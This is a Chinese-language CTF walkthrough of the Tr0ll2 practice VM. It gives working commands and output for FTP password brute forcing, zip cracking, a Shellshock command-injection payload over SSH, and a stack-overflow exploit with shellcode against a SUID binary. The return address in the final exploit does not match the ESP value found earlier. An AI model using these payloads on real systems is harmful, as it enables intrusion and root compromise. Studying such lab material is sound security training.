[红队渗透项目之Tr0ll2 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/331990.html)

# 信息搜集

1、端口扫描

```bash
└─# nmap -sVC -A -O -p- 192.168.0.102 -oA nmap.txt
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 82fe93b8fb38a677b5a625786b35e2a8 (DSA)
|   2048 7da599b8fb6765c96486aa2cd6ca085d (RSA)
|_  256 91b86a45be41fdc814b502a0667c8c96 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
MAC Address: 00:0C:29:65:7E:66 (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   4.13 ms 192.168.0.102 (192.168.0.102)
```

2、80 端口简单探测

目录扫描

```bash
└─# dirb http://192.168.0.102
```

发现 `robots.txt`

```http
http://192.168.0.102/robots.txt
```

```
User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
```

# web打点

## 80端口信息再搜集

紧接上文

技巧：burp 批量打开看响应

<img src=".\图片\Snipaste_2023-06-29_15-25-31.png" alt="Snipaste_2023-06-29_15-25-31" style="zoom:67%;" />

于是发现几个特殊目录

```http
http://192.168.0.102/noob/
http://192.168.0.102/keep_trying/
http://192.168.0.102/dont_bother/
http://192.168.0.102/ok_this_is_it/
```

这几个都是好像显示的同一张图片

<img src=".\图片\Snipaste_2023-06-29_15-29-04.png" alt="Snipaste_2023-06-29_15-29-04" style="zoom:80%;" />

把这些图片全下载下来看看信息

<img src=".\图片\Snipaste_2023-06-29_15-32-51.png" alt="Snipaste_2023-06-29_15-32-51" style="zoom:80%;" />

发现只有 picture3 的大小不一样，于是 strings 查看下字符串

```bash
─# strings picture3
Look Deep within y0ur_self for the answer
```

把 `y0ur_self` 拼接到目录，看到一个 base64 编码后的密码字典，下载后解码保存

```bash
└─# wget http://192.168.0.102/y0ur_self/answer.txt
└─# cat answer.txt | base64 -d > answer.list
```

# 21端口渗透

我们准备一个账号本 user.list，加上靶场关键词 `Tr0ll`，密码可以用之前找到的密码本，再里面也添加靶场关键词 `Tr0ll`

hydra 爆破

```bash
└─# hydra -L user.list -P answer.list ftp://192.168.0.102

[21][ftp] host: 192.168.0.102   login: Tr0ll   password: Tr0ll
```

ftp 登录，发现 `lmao.zip` ，于是下载到本地

```bash
└─# ftp 192.168.0.102
Connected to 192.168.0.102.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (192.168.0.102:root): Tr0ll
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||39148|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
226 Directory send OK.
ftp> binary 
200 Switching to Binary mode.
ftp> get lmao.zip
local: lmao.zip remote: lmao.zip
229 Entering Extended Passive Mode (|||46635|).
150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
100% |*********************************************************************************************************************|  1474       32.69 MiB/s    00:00 ETA
226 Transfer complete.
1474 bytes received in 00:00 (5.16 MiB/s)
```

## 爆破zip

lmao.zip 爆破为加密zip的密码

```bash
fcrackzip -u -D -p answer.list lmao.zip

[-u|--use-unzip] 使用 unzip 清除错误密码
[-D|--dictionary] 使用字典
[-p|--init-password string] 使用字符串作为初始密码/文件
```

```bash
└─# fcrackzip -u -D -p answer.list lmao.zip                                                                                                                 
PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL
```

密码为 `ItCantReallyBeThisEasyRightLOL`

查看 lmao.zip，解压得到 noob 文件，查看下知道为 ssh 的私钥

```bash
┌──(root💀kali)-[~/Tr0ll2]
└─# ls        
answer.list  answer.txt  hydra.restore  lmao.zip  nmap.txt.gnmap  nmap.txt.nmap  nmap.txt.xml  picture1  picture2  picture3  picture4  user.list
                                                                                                                                                                  
┌──(root💀kali)-[~/Tr0ll2]
└─# unzip lmao.zip
Archive:  lmao.zip
[lmao.zip] noob password: 
  inflating: noob                    
                                                                                                                                                                  
┌──(root💀kali)-[~/Tr0ll2]
└─# ls
answer.list  answer.txt  hydra.restore  lmao.zip  nmap.txt.gnmap  nmap.txt.nmap  nmap.txt.xml  noob  picture1  picture2  picture3  picture4  user.list
                                                                                                                                                                  
┌──(root💀kali)-[~/Tr0ll2]
└─# file noob                              
noob: PEM RSA private key
```

# SSH受限shell绕过

1、赋权并尝试ssh登录，失败。提示链接关闭了，可以登录需要外壳拿权限

```bash
└─# chmod 400 noob
└─# ssh -i noob noob@192.168.0.102 -o 'PubkeyAcceptedKeyTypes +ssh-rsa'                                                                                     255 ⨯
TRY HARDER LOL!
Connection to 192.168.0.102 closed.
```

2、shellshock env环境变量绕过ssh

Shellshock，又称Bashdoor，是在Unix中广泛使用的Bash shell中的一个安全漏洞，首次于2014年9月24日公开。shellshock Bash 漏洞利用CVE-2014-6271可以通过 SSH 被利用！

查看当前shell 的设置是否为bash
利用'() { :;}; cmd' 这个payload让操作系统将) { :;}; 误认为是函数环境变量！

```bash
ssh -i noob noob@192.168.0.102 -o 'PubkeyAcceptedKeyTypes +ssh-rsa' '() { :;}; cat /etc/passwd'
```

```bash
└─# ssh -i noob noob@192.168.0.102 -o 'PubkeyAcceptedKeyTypes +ssh-rsa' '() { :;}; cat /etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:104::/var/run/dbus:/bin/false
maleus:x:1000:1000:Tr0ll,,,:/home/maleus:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:104:111:ftp daemon,,,:/srv/ftp:/bin/false
noob:x:1002:1002::/home/noob:/bin/bash
Tr0ll:x:1001:1001::/home/tr0ll:/bin/false
```

3、得到权限

```bash
└─# ssh -i noob noob@192.168.0.102 -o 'PubkeyAcceptedKeyTypes +ssh-rsa' '() { :;}; /bin/bash'                                                               255 ⨯
id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
```

# 得到完美操作的shell

1、

```bash
└─# ssh -i noob noob@192.168.0.102 -o 'PubkeyAcceptedKeyTypes +ssh-rsa' '() { :;}; /bin/bash'                                                               255 ⨯
id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
python -c 'import pty; pty.spawn("/bin/bash")'
noob@Tr0ll2:~$ export TERM=xterm
export TERM=xterm
noob@Tr0ll2:~$ 
```

2、点击 Crtl+ z，再输入：

```
└─# stty raw -echo;fg
```

再点击键盘 Enter，于是得到完美手感的shell

```
noob@Tr0ll2:~$ clear
```

# 权限提升

## 查找suid权限文件

```bash
find / -perm -u=s -type f 2>/dev/null 
```

发现三个贵物

```bash
/nothing_to_see_here/choose_wisely/door2/r00t
/nothing_to_see_here/choose_wisely/door3/r00t
/nothing_to_see_here/choose_wisely/door1/r00t
```

```bash
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ls -al
total 20
drwsr-xr-x 2 root root 4096 Oct  5  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t
```

2、把三个贵物文件拷到本地 kali 查看

可以开python服务下载，也可以使用这里的第二种方法：

放入本地分析，将r00t编译为base64

```
base64 r00t
```

将转码值写入本地文本并解码成文件！

复制至本地文本：

```
gedit base.txt
```

base64解码并验证：

```
cat base.txt | base64 -d > r00t 
md5sum r00t   ---双方MD5值对比（因MD5不可逆）
```

kali得到三个文件

```bash
┌──(root💀kali)-[~/Tr0ll2/door]
└─# ls
door1  door2  door3
```

## 栈溢出提权

```
└─# file door2
└─# strings door2
```

在 door2 里找到了 典中典 `strcpy` 函数，door2 且是可执行程序，也可以把它加载到 ida 里查看，入参没有限制长度

这里运行下看看，直接输出了 123

```bash
┌──(root💀kali)-[~/Tr0ll2/door]
└─# chmod +x door2                                                                                                                                          126 ⨯
                                                                                                                                                                  
┌──(root💀kali)-[~/Tr0ll2/door]
└─# ./door2 123   
123 
```

并把 door1 和 door2 删除了，因为里面有个可怕的 reboot 重启命令

## 栈溢出操作步骤

### 1、找偏移量

pattern_create是生成一个字符串模板输入后根据EIP来确定覆盖return addr的长度。

1）利用pattern_create.rb，在本地生成300个字符，找偏移量

```
locate pattern_create.rb
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
```

2）GDB分析

gdb 是 GNU 开源组织发布的一个强大的Linux下的程序调试工具，逆向分析有非常多好用的工具，但是GDB毋庸置疑是最强之一，它的pwndbg和peda插件那就是辅助GDB上神器行列的最强帮手。

用 gdb 进行拆解，找溢出值，填充300的值，获取偏移地址：

<img src=".\图片\Snipaste_2023-06-29_16-44-01.png" alt="Snipaste_2023-06-29_16-44-01" style="zoom:80%;" />

获得地址：`0x6a413969`

3）获得偏移量

利用pattern_offset.rb，找偏移量：

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6a413969
```

```bash
└─# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6a413969
[*] Exact match at offset 268
```

获得偏移量为268

### 2、查找ESP的溢出地址

前面找到偏移量后，可以知道栈空间大小占据空间位置，接下来找到跳板地址也就是ESP，就可以跳到恶意代码shellcode位置！

1）print写入268个A和4个B，查找出EIP地址

```
r $(python2 -c 'print "A"*268 + "B"*4')
info r
```

<img src=".\图片\Snipaste_2023-06-29_16-50-15.png" alt="Snipaste_2023-06-29_16-50-15" style="zoom:80%;" />

继续获取ESP值。

2）获取ESP（下一跳值）

print写入268个A、4个B和20个C，查找出ESP地址：

```
r $(python2 -c 'print "A"*268 + "B"*4 + "C"*20')
```

<img src=".\图片\Snipaste_2023-06-29_16-53-44.png" alt="Snipaste_2023-06-29_16-53-44" style="zoom:80%;" />

获得 esp 地址为 `0xffffd250`

反写为：x50/xd2/xff/xff

### 4、shellcode编写

谷歌搜索获得shellcode：

```
http://shell-storm.org/shellcode/files/shellcode-827.php
```

因为它运行在Intel，并且操作系统是86位Linux，因此我从此处获取Shellcode连接：



<img src=".\图片\1651646253_62721f2d4a34f5e3dc045.png!small" alt="3636" style="zoom:80%;" />

```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

当选择好shellcode恶意代码后，即可进行exp写入shellcode进行编写payload。

### 5、EXP编写

接下来需要执行exp，获得shell，开始编写。
编写EXP：

```
./r00t $(python -c 'print "A"*偏移量 + "反向ESP" + "\x90"*20 + "shellcode"')
```

按照模板编写：

```
./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90"*20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
python -c 'import pty; pty.spawn("/bin/bash")'  #执行tty
```

<img src=".\图片\1651646261_62721f356a7dd33b48516.png!small" alt="1651646261_62721f356a7dd33b48516.png!small?1651646261873"  />

可看到成功缓冲区溢出跳转执行shellcode获得bash的shell！

# 总结

fcrackzip 可根据字典破解 zip

ssh的shell受限时，shellshock env环境变量绕过ssh

典中典 `strcpy` 函数导致栈溢出

栈溢出里 `\x90` 指令为空指令，直接继续运行



